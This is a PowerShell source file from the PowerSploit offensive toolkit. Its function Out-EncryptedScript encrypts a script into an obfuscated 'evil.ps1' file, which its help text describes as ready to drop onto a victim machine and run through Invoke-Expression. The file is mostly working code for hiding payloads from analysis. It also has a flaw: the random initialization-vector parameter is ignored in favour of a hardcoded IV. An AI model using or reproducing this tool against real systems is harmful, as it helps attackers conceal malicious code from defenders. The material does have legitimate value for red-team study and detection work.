function Out-EncryptedScript
{
<#
.SYNOPSIS

Encrypts text files/scripts.

PowerSploit Function: Out-EncryptedScript
Author: Matthew Graeber (@mattifestation)
License: BSD 3-Clause
Required Dependencies: None
Optional Dependencies: None

.DESCRIPTION

Out-EncryptedScript will encrypt a script (or any text file for that matter) and output the results to a minimally obfuscated script - evil.ps1.

.PARAMETER ScriptPath

Path to this script

.PARAMETER Password

Password to encrypt/decrypt the script

.PARAMETER Salt

Salt value for encryption/decryption. This can be any string value.

.EXAMPLE

C:\PS> Out-EncryptedScript .\Naughty-Script.ps1 password salty

Description
-----------
Encrypt the contents of this file with a password and salt. This will make analysis of the script impossible without the correct password and salt combination. This command will generate evil.ps1 that can dropped onto the victim machine. It only consists of a decryption function 'de' and the base64-encoded ciphertext.

.EXAMPLE

C:\PS> [String] $cmd = Get-Content .\evil.ps1
C:\PS> Invoke-Expression $cmd
C:\PS> $decrypted = de password salt
C:\PS> Invoke-Expression $decrypted

Description
-----------
This series of instructions assumes you've already encrypted a script and named it evil.ps1. The contents are then decrypted and the unencrypted script is called via Invoke-Expression

.NOTES

This command can be used to encrypt any text-based file/script

.LINK

http://www.exploit-monday.com
#>

    [CmdletBinding()] Param (
        [Parameter(Position = 0, Mandatory = $True)]
        [String]
        $ScriptPath,
    
        [Parameter(Position = 1, Mandatory = $True)]
        [String]
        $Password,
    
        [Parameter(Position = 2, Mandatory = $True)]
        [String]
        $Salt,
    
        [Parameter(Position = 3)]
        [String]
        $InitializationVector = ( @( foreach ($i in 1..16) { [Char](Get-Random -Min 0x41 -Max 0x5B) } ) -join '' ), # Generate random 16 character IV
    
        [Parameter(Position = 4)]
        [String]
        $FilePath = '.\evil.ps1'
    )

    $AsciiEncoder = New-Object System.Text.ASCIIEncoding
    $ivBytes = $AsciiEncoder.GetBytes("CRACKMEIFYOUCAN!")
    # While this can be used to encrypt any file, it's primarily designed to encrypt itself.
    [Byte[]] $scriptBytes = Get-Content -Encoding byte -Path $ScriptPath
    $DerivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($Password, $AsciiEncoder.GetBytes($Salt), "SHA1", 2)
    $Key = New-Object System.Security.Cryptography.RijndaelManaged
    $Key.Mode = [System.Security.Cryptography.CipherMode]::CBC
    [Byte[]] $KeyBytes = $DerivedPass.GetBytes(32)
    $Encryptor = $Key.CreateEncryptor($KeyBytes, $ivBytes)
    $MemStream = New-Object System.IO.MemoryStream
    $CryptoStream = New-Object System.Security.Cryptography.CryptoStream($MemStream, $Encryptor, [System.Security.Cryptography.CryptoStreamMode]::Write)
    $CryptoStream.Write($scriptBytes, 0, $scriptBytes.Length)
    $CryptoStream.FlushFinalBlock()
    $CipherTextBytes = $MemStream.ToArray()
    $MemStream.Close()
    $CryptoStream.Close()
    $Key.Clear()
    $Cipher = [Convert]::ToBase64String($CipherTextBytes)

# Generate encrypted PS1 file. All that will be included is the base64-encoded ciphertext and a slightly 'obfuscated' decrypt function
$Output = 'function de([String] $b, [String] $c)
{
$a = "'
$Output += $cipher
$Output += '"'
$Output += ';
$encoding = New-Object System.Text.ASCIIEncoding;
$dd = $encoding.GetBytes("CRACKMEIFYOUCAN!");
$aa = [Convert]::FromBase64String($a);
$derivedPass = New-Object System.Security.Cryptography.PasswordDeriveBytes($b, $encoding.GetBytes($c), "SHA1", 2);
[Byte[]] $e = $derivedPass.GetBytes(32);
$f = New-Object System.Security.Cryptography.RijndaelManaged;
$f.Mode = [System.Security.Cryptography.CipherMode]::CBC;
[Byte[]] $h = New-Object Byte[]($aa.Length);
$g = $f.CreateDecryptor($e, $dd);
$i = New-Object System.IO.MemoryStream($aa, $True);
$j = New-Object System.Security.Cryptography.CryptoStream($i, $g, [System.Security.Cryptography.CryptoStreamMode]::Read);
$r = $j.Read($h, 0, $h.Length);
$i.Close();
$j.Close();
$f.Clear();
return $encoding.GetString($h,0,$h.Length);
}'

    # Output decrypt function and ciphertext to evil.ps1
    Out-File -InputObject $Output -Encoding ASCII $FilePath

    Write-Verbose "Encrypted PS1 file saved to: $(Resolve-Path $FilePath)"

}
